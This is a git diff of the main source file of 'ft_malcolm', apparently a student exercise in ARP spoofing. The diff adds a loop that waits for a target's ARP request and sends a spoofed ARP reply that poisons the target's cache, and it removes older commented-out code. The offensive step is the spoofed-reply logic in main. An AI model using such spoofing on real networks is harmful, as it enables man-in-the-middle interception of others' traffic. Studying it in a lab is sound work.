@@ -6,7 +6,7 @@
 /*   By: mamartin <mamartin@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2022/10/04 19:03:49 by mamartin          #+#    #+#             */
-/*   Updated: 2022/10/09 03:53:24 by mamartin         ###   ########.fr       */
+/*   Updated: 2022/10/12 14:17:09 by mamartin         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -16,17 +16,19 @@
 #include <net/if.h>
 #include <netdb.h>
 #include <ifaddrs.h>
-#include <ifaddrs.h>
 #include <linux/if_link.h>
 #include <arpa/inet.h>
+#include <signal.h>
 
 #include <unistd.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdbool.h>
-#include <string.h>
 
 #include "ft_malcolm.h"
+#include "shell_colors.h"
+
+bool g_must_exit = false;
 
 static int validate_arguments(char **argv, t_host* source, t_host* target)
 {
@@ -76,100 +78,60 @@ static int get_interface_index()
 	return index;
 }
 
-static int create_arp_socket(int ifindex)
+static void sigint_handler(int signum)
 {
-	int fd = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
-	if (fd == -1)
-		return -1;
-
-	struct sockaddr_ll addr;
-	ft_memset(&addr, 0, sizeof(struct sockaddr_ll));
-	addr.sll_family = AF_PACKET;
-	addr.sll_ifindex = ifindex;
-	addr.sll_protocol = htons(ETH_P_ARP);
-
-	if (bind(fd, (struct sockaddr*)&addr, sizeof(struct sockaddr_ll)) == -1)
-	{
-		close(fd);
-		return -1;
-	}
-	return fd;
+	(void)signum;
+	printf("Received %sSIGINT%s. Quitting...\n", RED, RESET);
+	g_must_exit = true;
 }
 
 int main(int argc, char **argv)
 {
 	if (argc != 5)
-		return print_usage(argv[0]);
+		print_usage(argv[0]); // exit
+	signal(SIGINT, &sigint_handler);
 
-	t_host source;
-	t_host target;
+	t_host source = {0};
+	t_host target = {0};
 	if (validate_arguments(argv, &source, &target) == -1)
 		return EXIT_FAILURE;
 
 	if (getuid() != 0)
-		return failure("root privileges are needed to create packet socket");
+		failure("root privileges are needed to create packet socket", -1);
 
 	int ifindex = get_interface_index();
 	if (ifindex == -1)
-		return failure("failed to retrieve network interface");
+		failure("failed to retrieve network interface", -1);
 
-	int sock = create_arp_socket(ifindex);
+	int sock = socket(AF_PACKET, SOCK_RAW | SOCK_NONBLOCK, htons(ETH_P_ARP));
 	if (sock == -1)
-		return failure("failed to create ARP socket");
+		failure("failed to create ARP socket", -1);
 
-	// char buf[200] = { 0 };
-	// ssize_t bytes = recvfrom(sock, buf, sizeof(buf), 0, NULL, NULL);
-	// if (bytes == -1)
-	// {
-	// 	close(sock);
-	// 	failure("failed to create ARP socket");
-	// }
+	printf("Waiting for %s%s%s to request %s%s%s's MAC address...\n",
+		BLUE, argv[3], RESET,
+		YELLOW, argv[1], RESET
+	);
 
-	// struct ether_arp* reply = (struct ether_arp*)buf;
-	// printf(
-	// 	"received %ld bytes %s: MAC address = %d %02x:%02x:%02x:%02x:%02x:%02x\n",
-	// 	bytes, 
-	// 	ntohs(reply->arp_op),
-	// 	reply->arp_sha[0],	
-	// 	reply->arp_sha[1],	
-	// 	reply->arp_sha[2],	
-	// 	reply->arp_sha[3],
-	// 	reply->arp_sha[4],
-	// 	reply->arp_sha[5]
-	// );
-
-	// listen ARP request
-	// send ARP reply
-
-	// struct sockaddr_ll addr;
-	// ft_memset(&addr, 0, sizeof(struct sockaddr_ll));
-	// addr.sll_family = AF_PACKET;
-	// addr.sll_protocol = htons(ETH_P_ARP);
-	// addr.sll_ifindex = 2;
-	// addr.sll_halen = ETH_ALEN;
-	// ft_memset(addr.sll_addr, 0xFF, ETH_ALEN);
-
-	// struct ether_arp req;
-	// req.arp_hrd = htons(ARPHRD_ETHER);
-	// req.arp_pro = htons(ETH_P_IP);
-	// req.arp_hln = ETHER_ADDR_LEN;
-	// req.arp_pln = sizeof(in_addr_t);
-	// req.arp_op = htons(ARPOP_REQUEST);
-	// ft_memset(&req.arp_tha, 0, sizeof(req.arp_tha));
-
-	// /* Source */
-	// if (mac_addr_to_array(argv[2], req.arp_sha, ETH_ALEN) == -1)
-	// 	failure("invalid MAC address");
-	// if (ip_addr_to_array(argv[1], req.arp_spa, sizeof(in_addr_t)) == -1)
-	// 	failure("invalid MAC address");
-
-	// /* Target */
-	// if (ip_addr_to_array(argv[3], req.arp_tpa, sizeof(in_addr_t)) == -1)
-	// 	failure("invalid MAC address");
-
-	// ssize_t bytes = sendto(sckfd, &req, sizeof(req), 0, (struct sockaddr*)&addr, sizeof(addr));
-	// if (bytes <= 0)
-	// 	fatal("sendto");
+	while (!g_must_exit)
+	{
+		int ret = wait_arp_request(sock, &source, &target);
+		if (ret == -1)
+			failure("failed to receive ARP request", sock);
+		else if (ret)
+		{
+			printf("Done. Now sending spoofed source to %s%s%s...\n", BLUE, argv[3], RESET);
+			if (send_arp_reply(sock, ifindex, &source, &target) == -1)
+				failure("failed to send ARP reply", sock);
+			else
+				printf("Spoofed %sARP reply%s sent %ssuccessfully%s.\nYou may now check %sARP cache%s on %starget%s.\n",
+					PURPLE, RESET,
+					GREEN, RESET,
+					PURPLE, RESET, 
+					BLUE, RESET
+				);
+			break ;
+		}
+	}
 
 	close(sock);
 	return EXIT_SUCCESS;
